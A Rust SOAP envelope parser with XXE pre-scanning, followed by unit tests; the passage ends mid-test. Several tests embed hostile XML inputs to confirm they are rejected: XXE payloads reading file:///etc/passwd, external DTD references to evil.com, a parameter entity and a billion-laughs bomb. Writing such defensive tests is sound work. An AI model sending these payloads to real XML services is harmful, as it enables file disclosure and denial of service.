//! SOAP XML parsing utilities.
//!
//! Uses quick-xml which is safe against XXE by default (doesn't expand entities).

use crate::config::SoapVersion;
use crate::error::{Violation, ViolationCode};
use quick_xml::events::{BytesStart, Event};
use quick_xml::Reader;

/// SOAP namespace URIs.
pub const SOAP_11_NS: &str = "http://schemas.xmlsoap.org/soap/envelope/";
pub const SOAP_12_NS: &str = "http://www.w3.org/2003/05/soap-envelope";
pub const WSSE_NS: &str =
    "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd";
pub const WSU_NS: &str =
    "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd";
pub const SAML_NS: &str = "urn:oasis:names:tc:SAML:2.0:assertion";

/// Parsed SOAP envelope.
#[derive(Debug, Clone)]
pub struct SoapEnvelope {
    /// Detected SOAP version
    pub version: SoapVersion,
    /// SOAP Header (if present)
    pub header: Option<SoapHeader>,
    /// SOAP Body
    pub body: SoapBody,
    /// Raw XML for further processing
    pub raw_xml: String,
}

/// Parsed SOAP Header.
#[derive(Debug, Clone, Default)]
pub struct SoapHeader {
    /// WS-Security header (if present)
    pub security: Option<WsSecurityHeader>,
    /// All header elements
    pub elements: Vec<HeaderElement>,
}

/// A generic header element.
#[derive(Debug, Clone)]
pub struct HeaderElement {
    /// Element local name
    pub local_name: String,
    /// Element namespace URI
    pub namespace: Option<String>,
    /// Must understand flag
    pub must_understand: bool,
}

/// Parsed WS-Security header.
#[derive(Debug, Clone, Default)]
pub struct WsSecurityHeader {
    /// Timestamp element
    pub timestamp: Option<SecurityTimestamp>,
    /// Username token
    pub username_token: Option<UsernameToken>,
    /// SAML assertion present
    pub has_saml_assertion: bool,
}

/// WS-Security Timestamp.
#[derive(Debug, Clone)]
pub struct SecurityTimestamp {
    /// Created timestamp (ISO 8601)
    pub created: Option<String>,
    /// Expires timestamp (ISO 8601)
    pub expires: Option<String>,
}

/// WS-Security UsernameToken.
#[derive(Debug, Clone)]
pub struct UsernameToken {
    /// Username
    pub username: String,
    /// Password type URI
    pub password_type: Option<String>,
    /// Nonce (base64 encoded)
    pub nonce: Option<String>,
    /// Created timestamp
    pub created: Option<String>,
}

/// Parsed SOAP Body.
#[derive(Debug, Clone)]
pub struct SoapBody {
    /// First operation element name
    pub operation: Option<String>,
    /// Operation namespace
    pub operation_namespace: Option<String>,
    /// Body content analysis
    pub analysis: BodyAnalysis,
}

/// Body content analysis.
#[derive(Debug, Clone, Default)]
pub struct BodyAnalysis {
    /// Maximum nesting depth found
    pub max_depth: u32,
    /// Total element count
    pub element_count: u32,
    /// Maximum text content length
    pub max_text_length: usize,
    /// Contains CDATA sections
    pub has_cdata: bool,
    /// Contains comments
    pub has_comments: bool,
    /// Namespaces found in body
    pub namespaces: Vec<String>,
}

/// Parse raw bytes as SOAP envelope.
pub fn parse_soap_envelope(data: &[u8]) -> Result<SoapEnvelope, Violation> {
    let xml_str = std::str::from_utf8(data)
        .map_err(|e| Violation::new(ViolationCode::InvalidXml, format!("Invalid UTF-8: {}", e)))?;

    // Pre-scan for XXE patterns (belt-and-suspenders with quick-xml's safety)
    check_xxe_patterns(xml_str)?;

    let mut reader = Reader::from_str(xml_str);
    reader.config_mut().trim_text(true);

    let mut version: Option<SoapVersion> = None;
    let mut header: Option<SoapHeader> = None;
    let _body: Option<SoapBody> = None;

    let mut current_depth = 0u32;
    let mut in_envelope = false;
    let mut in_header = false;
    let mut in_body = false;
    let mut in_security = false;
    let mut in_timestamp = false;
    let mut in_username_token = false;

    let mut body_analysis = BodyAnalysis::default();
    let mut body_start_depth = 0u32;
    let mut security_start_depth = 0u32;
    let mut timestamp_start_depth = 0u32;
    let mut username_token_start_depth = 0u32;

    let mut current_header = SoapHeader::default();
    let mut current_security = WsSecurityHeader::default();
    let current_timestamp = SecurityTimestamp {
        created: None,
        expires: None,
    };
    let current_username_token = UsernameToken {
        username: String::new(),
        password_type: None,
        nonce: None,
        created: None,
    };

    let mut operation_name: Option<String> = None;
    let mut operation_ns: Option<String> = None;
    let mut first_body_element = true;

    let mut buf = Vec::new();

    loop {
        match reader.read_event_into(&mut buf) {
            Ok(Event::Start(ref e)) => {
                current_depth += 1;
                let local_name = local_name_str(e);
                let ns = get_namespace(&reader, e);

                // Detect Envelope
                if !in_envelope && local_name == "Envelope" {
                    if let Some(ref ns_uri) = ns {
                        if ns_uri == SOAP_11_NS {
                            version = Some(SoapVersion::Soap11);
                            in_envelope = true;
                        } else if ns_uri == SOAP_12_NS {
                            version = Some(SoapVersion::Soap12);
                            in_envelope = true;
                        }
                    }
                }
                // Detect Header
                else if in_envelope && !in_header && !in_body && local_name == "Header" {
                    in_header = true;
                }
                // Detect Body
                else if in_envelope && !in_body && local_name == "Body" {
                    in_body = true;
                    body_start_depth = current_depth;
                }
                // Inside Header
                else if in_header {
                    // WS-Security
                    if local_name == "Security" && ns.as_deref() == Some(WSSE_NS) {
                        in_security = true;
                        security_start_depth = current_depth;
                    } else if in_security {
                        if local_name == "Timestamp" {
                            in_timestamp = true;
                            timestamp_start_depth = current_depth;
                        } else if local_name == "UsernameToken" {
                            in_username_token = true;
                            username_token_start_depth = current_depth;
                        } else if local_name == "Assertion" && ns.as_deref() == Some(SAML_NS) {
                            current_security.has_saml_assertion = true;
                        }
                    } else {
                        // Other header element
                        let must_understand = get_must_understand(&reader, e);
                        current_header.elements.push(HeaderElement {
                            local_name: local_name.to_string(),
                            namespace: ns.clone(),
                            must_understand,
                        });
                    }
                }
                // Inside Body
                else if in_body {
                    body_analysis.element_count += 1;
                    let body_depth = current_depth - body_start_depth;
                    if body_depth > body_analysis.max_depth {
                        body_analysis.max_depth = body_depth;
                    }

                    if first_body_element {
                        operation_name = Some(local_name.to_string());
                        operation_ns = ns.clone();
                        first_body_element = false;
                    }

                    if let Some(ref ns_uri) = ns {
                        if !body_analysis.namespaces.contains(ns_uri) {
                            body_analysis.namespaces.push(ns_uri.clone());
                        }
                    }
                }
            }

            Ok(Event::Empty(ref e)) => {
                // Handle self-closing tags like <DeleteUser/>
                let local_name = local_name_str(e);
                let ns = get_namespace(&reader, e);

                if in_body {
                    body_analysis.element_count += 1;

                    if first_body_element {
                        operation_name = Some(local_name.to_string());
                        operation_ns = ns.clone();
                        first_body_element = false;
                    }

                    if let Some(ref ns_uri) = ns {
                        if !body_analysis.namespaces.contains(ns_uri) {
                            body_analysis.namespaces.push(ns_uri.clone());
                        }
                    }
                }
            }

            Ok(Event::End(_)) => {
                current_depth = current_depth.saturating_sub(1);

                // Check if we're leaving sections
                if in_timestamp && current_depth < timestamp_start_depth {
                    in_timestamp = false;
                    current_security.timestamp = Some(current_timestamp.clone());
                }
                if in_username_token && current_depth < username_token_start_depth {
                    in_username_token = false;
                    current_security.username_token = Some(current_username_token.clone());
                }
                if in_security && current_depth < security_start_depth {
                    in_security = false;
                    current_header.security = Some(current_security.clone());
                }
                if in_header && current_depth < 2 {
                    in_header = false;
                    header = Some(current_header.clone());
                }
                if in_body && current_depth < 2 {
                    in_body = false;
                }
            }

            Ok(Event::Text(ref e)) => {
                let text_len = e.len();
                if text_len > body_analysis.max_text_length {
                    body_analysis.max_text_length = text_len;
                }

                // Capture specific text content in Security elements
                if in_timestamp {
                    // Would need element tracking to properly capture Created/Expires
                }
                if in_username_token {
                    // Would need element tracking to properly capture Username, etc.
                }
            }

            Ok(Event::CData(_)) => {
                body_analysis.has_cdata = true;
            }

            Ok(Event::Comment(_)) => {
                body_analysis.has_comments = true;
            }

            Ok(Event::Eof) => break,

            Err(e) => {
                return Err(Violation::new(
                    ViolationCode::InvalidXml,
                    format!("XML parse error: {}", e),
                ));
            }

            _ => {}
        }

        buf.clear();
    }

    let version = version.ok_or_else(|| {
        Violation::new(
            ViolationCode::MissingEnvelope,
            "No valid SOAP Envelope found with recognized namespace",
        )
    })?;

    Ok(SoapEnvelope {
        version,
        header,
        body: SoapBody {
            operation: operation_name,
            operation_namespace: operation_ns,
            analysis: body_analysis,
        },
        raw_xml: xml_str.to_string(),
    })
}

/// Check for XXE attack patterns.
fn check_xxe_patterns(xml: &str) -> Result<(), Violation> {
    // DOCTYPE detection
    if xml.contains("<!DOCTYPE") || xml.contains("<!doctype") {
        return Err(Violation::new(
            ViolationCode::DoctypeDetected,
            "DOCTYPE declarations are not allowed",
        ));
    }

    // External entity patterns
    if xml.contains("<!ENTITY") || xml.contains("<!entity") {
        return Err(Violation::new(
            ViolationCode::ExternalEntityDetected,
            "Entity declarations are not allowed",
        ));
    }

    // System/Public entity references
    if (xml.contains("SYSTEM") || xml.contains("PUBLIC")) && xml.contains("<!") {
        return Err(Violation::new(
            ViolationCode::ExternalEntityDetected,
            "External entity references are not allowed",
        ));
    }

    Ok(())
}

/// Extract local name from element.
fn local_name_str(e: &BytesStart) -> String {
    let name = e.local_name();
    std::str::from_utf8(name.as_ref()).unwrap_or("").to_string()
}

/// Get namespace URI for element.
fn get_namespace(_reader: &Reader<&[u8]>, e: &BytesStart) -> Option<String> {
    // Try to find xmlns attribute or prefixed namespace
    for attr in e.attributes().flatten() {
        let key = std::str::from_utf8(attr.key.as_ref()).unwrap_or("");
        if key == "xmlns" || key.starts_with("xmlns:") {
            return std::str::from_utf8(&attr.value).ok().map(String::from);
        }
    }

    // Check if element has a prefix and look for it
    let name_bytes = e.name();
    let name = std::str::from_utf8(name_bytes.as_ref()).unwrap_or("");
    if let Some(prefix) = name.split(':').next() {
        if prefix != name {
            // Has a prefix, would need namespace resolution
            // For now, return None as we'd need full namespace tracking
        }
    }

    None
}

/// Check mustUnderstand attribute.
fn get_must_understand(_reader: &Reader<&[u8]>, e: &BytesStart) -> bool {
    for attr in e.attributes().flatten() {
        let key = std::str::from_utf8(attr.key.as_ref()).unwrap_or("");
        if key.ends_with("mustUnderstand") {
            let value = std::str::from_utf8(&attr.value).unwrap_or("");
            return value == "1" || value == "true";
        }
    }
    false
}

/// Extract SOAPAction from HTTP header value (removes quotes).
pub fn parse_soap_action(header_value: &str) -> String {
    header_value.trim().trim_matches('"').to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    const SOAP_11_SAMPLE: &str = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <m:Trans xmlns:m="http://example.org/trans">234</m:Trans>
  </soap:Header>
  <soap:Body>
    <m:GetPrice xmlns:m="http://example.org/stock">
      <m:Item>Apples</m:Item>
    </m:GetPrice>
  </soap:Body>
</soap:Envelope>"#;

    const SOAP_12_SAMPLE: &str = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.org/users">
      <m:UserId>123</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>"#;

    #[test]
    fn test_parse_soap_11() {
        let envelope = parse_soap_envelope(SOAP_11_SAMPLE.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap11);
        assert!(envelope.header.is_some());
        assert_eq!(envelope.body.operation, Some("GetPrice".to_string()));
    }

    #[test]
    fn test_parse_soap_12() {
        let envelope = parse_soap_envelope(SOAP_12_SAMPLE.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap12);
        assert!(envelope.header.is_none());
        assert_eq!(envelope.body.operation, Some("GetUser".to_string()));
    }

    #[test]
    fn test_xxe_detection() {
        let xxe_payload = r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>&xxe;</soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xxe_payload.as_bytes());
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_parse_soap_action() {
        assert_eq!(parse_soap_action("\"GetUser\""), "GetUser");
        assert_eq!(parse_soap_action("GetUser"), "GetUser");
        assert_eq!(parse_soap_action("  \"GetUser\"  "), "GetUser");
    }

    // --- SOAP envelope validation: malformed XML ---

    #[test]
    fn test_malformed_xml_missing_closing_tag() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
  </soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::InvalidXml);
    }

    #[test]
    fn test_empty_input() {
        let result = parse_soap_envelope(b"");
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::MissingEnvelope);
    }

    #[test]
    fn test_non_soap_xml() {
        let xml = r#"<?xml version="1.0"?>
<root>
  <element>value</element>
</root>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::MissingEnvelope);
    }

    #[test]
    fn test_invalid_utf8() {
        let invalid_bytes: &[u8] = &[0xFF, 0xFE, 0x00, 0x01];
        let result = parse_soap_envelope(invalid_bytes);
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::InvalidXml);
        assert!(violation.message.contains("Invalid UTF-8"));
    }

    #[test]
    fn test_envelope_wrong_namespace() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://wrong-namespace.example.com/">
  <soap:Body>
    <GetUser/>
  </soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        let violation = result.unwrap_err();
        assert_eq!(violation.code, ViolationCode::MissingEnvelope);
    }

    // --- SOAP 1.1 vs 1.2 version detection ---

    #[test]
    fn test_soap_11_namespace_detection() {
        let xml = r#"<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/">
  <Body>
    <TestOp xmlns="http://example.org/test"/>
  </Body>
</Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap11);
    }

    #[test]
    fn test_soap_12_namespace_detection() {
        let xml = r#"<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <TestOp xmlns="http://example.org/test"/>
  </Body>
</Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap12);
    }

    // --- Header parsing ---

    #[test]
    fn test_envelope_without_header() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert!(envelope.header.is_none());
    }

    #[test]
    fn test_envelope_with_empty_header() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        // Empty header (self-closing) should still be parsed
        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        // Self-closing Header won't trigger in_header flow, so header remains None
        assert!(envelope.header.is_none());
    }

    #[test]
    fn test_header_with_multiple_elements() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <m:Trans xmlns:m="http://example.org/trans">234</m:Trans>
    <n:Auth xmlns:n="http://example.org/auth">token123</n:Auth>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        assert_eq!(header.elements.len(), 2);
        assert_eq!(header.elements[0].local_name, "Trans");
        assert_eq!(header.elements[1].local_name, "Auth");
    }

    // --- WS-Security header parsing ---

    #[test]
    fn test_ws_security_header_detected() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>admin</wsse:Username>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        assert!(header.security.is_some());
    }

    #[test]
    fn test_ws_security_with_timestamp() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                   xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsu:Timestamp>
        <wsu:Created>2025-01-01T00:00:00Z</wsu:Created>
        <wsu:Expires>2025-01-01T00:05:00Z</wsu:Expires>
      </wsu:Timestamp>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        let security = header.security.as_ref().unwrap();
        // Timestamp element should be detected
        assert!(security.timestamp.is_some());
    }

    #[test]
    fn test_ws_security_with_saml_assertion() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        <saml:Issuer>https://idp.example.org</saml:Issuer>
      </saml:Assertion>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        let security = header.security.as_ref().unwrap();
        assert!(security.has_saml_assertion);
    }

    #[test]
    fn test_ws_security_no_saml_when_absent() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>user</wsse:Username>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        let security = header.security.as_ref().unwrap();
        assert!(!security.has_saml_assertion);
    }

    // --- Body analysis ---

    #[test]
    fn test_body_element_count() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUsers xmlns:m="http://example.org/users">
      <m:Filter>
        <m:Name>John</m:Name>
        <m:Age>30</m:Age>
      </m:Filter>
      <m:Pagination>
        <m:Page>1</m:Page>
        <m:PageSize>10</m:PageSize>
      </m:Pagination>
    </m:GetUsers>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        // GetUsers, Filter, Name, Age, Pagination, Page, PageSize = 7 elements
        assert_eq!(envelope.body.analysis.element_count, 7);
    }

    #[test]
    fn test_body_depth_calculation() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <a><b><c><d>deep</d></c></b></a>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        // Body is at depth 2, a=3, b=4, c=5, d=6 => relative depth 4
        assert!(envelope.body.analysis.max_depth >= 4);
    }

    #[test]
    fn test_body_with_self_closing_operation() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DeleteUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.body.operation, Some("DeleteUser".to_string()));
        // Self-closing element should be counted
        assert_eq!(envelope.body.analysis.element_count, 1);
    }

    #[test]
    fn test_body_operation_detection() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns:CreateOrder xmlns:ns="http://example.org/orders">
      <ns:Item>Widget</ns:Item>
      <ns:Quantity>5</ns:Quantity>
    </ns:CreateOrder>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.body.operation, Some("CreateOrder".to_string()));
    }

    #[test]
    fn test_body_namespace_tracking() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.org/users">
      <m:UserId>123</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert!(envelope
            .body
            .analysis
            .namespaces
            .contains(&"http://example.org/users".to_string()));
    }

    #[test]
    fn test_body_cdata_detection() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:SaveData xmlns:m="http://example.org/data">
      <m:Content><![CDATA[Some raw <content> here]]></m:Content>
    </m:SaveData>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert!(envelope.body.analysis.has_cdata);
    }

    #[test]
    fn test_body_comment_detection() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!-- This is a comment -->
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert!(envelope.body.analysis.has_comments);
    }

    #[test]
    fn test_body_text_length_tracking() {
        let long_text = "A".repeat(500);
        let xml = format!(
            r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:SaveData xmlns:m="http://example.org/data">
      <m:Content>{}</m:Content>
    </m:SaveData>
  </soap:Body>
</soap:Envelope>"#,
            long_text
        );

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert!(envelope.body.analysis.max_text_length >= 500);
    }

    #[test]
    fn test_raw_xml_preserved() {
        let envelope = parse_soap_envelope(SOAP_11_SAMPLE.as_bytes()).unwrap();
        assert_eq!(envelope.raw_xml, SOAP_11_SAMPLE);
    }

    // --- XXE prevention ---

    #[test]
    fn test_xxe_doctype_lowercase() {
        let xml = r#"<?xml version="1.0"?>
<!doctype foo>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_xxe_entity_declaration() {
        let xml = r#"<?xml version="1.0"?>
<!ENTITY xxe "malicious">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err().code,
            ViolationCode::ExternalEntityDetected
        );
    }

    #[test]
    fn test_xxe_entity_declaration_lowercase() {
        let xml = r#"<?xml version="1.0"?>
<!entity xxe "malicious">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err().code,
            ViolationCode::ExternalEntityDetected
        );
    }

    #[test]
    fn test_xxe_system_entity() {
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        // Should match DOCTYPE first
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_xxe_public_entity() {
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "http://evil.com/xxe" "http://evil.com/xxe.dtd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_xxe_billion_laughs_pattern() {
        // Classic billion laughs / XML bomb pattern
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        // Should detect DOCTYPE
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_xxe_external_dtd_reference() {
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_xxe_parameter_entity() {
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % pe SYSTEM "file:///etc/passwd">%pe;]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
    }

    #[test]
    fn test_safe_xml_no_false_positive_for_system_in_text() {
        // The word "SYSTEM" appearing in regular text should NOT trigger XXE detection
        // unless it's alongside "<!" pattern
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetSystem xmlns:m="http://example.org/admin">
      <m:SystemName>SYSTEM One</m:SystemName>
    </m:GetSystem>
  </soap:Body>
</soap:Envelope>"#;

        // This should parse successfully because "SYSTEM" without "<!" is safe
        let result = parse_soap_envelope(xml.as_bytes());
        assert!(result.is_ok());
    }

    // --- SOAPAction parsing ---

    #[test]
    fn test_parse_soap_action_with_namespace() {
        assert_eq!(
            parse_soap_action("\"http://example.org/GetUser\""),
            "http://example.org/GetUser"
        );
    }

    #[test]
    fn test_parse_soap_action_empty_string() {
        assert_eq!(parse_soap_action(""), "");
    }

    #[test]
    fn test_parse_soap_action_only_quotes() {
        assert_eq!(parse_soap_action("\"\""), "");
    }

    #[test]
    fn test_parse_soap_action_whitespace() {
        assert_eq!(parse_soap_action("   "), "");
    }

    // --- mustUnderstand attribute ---

    #[test]
    fn test_must_understand_attribute() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <m:Transaction xmlns:m="http://example.org/trans" soap:mustUnderstand="1">123</m:Transaction>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        assert!(!header.elements.is_empty());
        assert!(header.elements[0].must_understand);
    }

    #[test]
    fn test_must_understand_false() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <m:Transaction xmlns:m="http://example.org/trans" soap:mustUnderstand="0">123</m:Transaction>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        let header = envelope.header.as_ref().unwrap();
        assert!(!header.elements.is_empty());
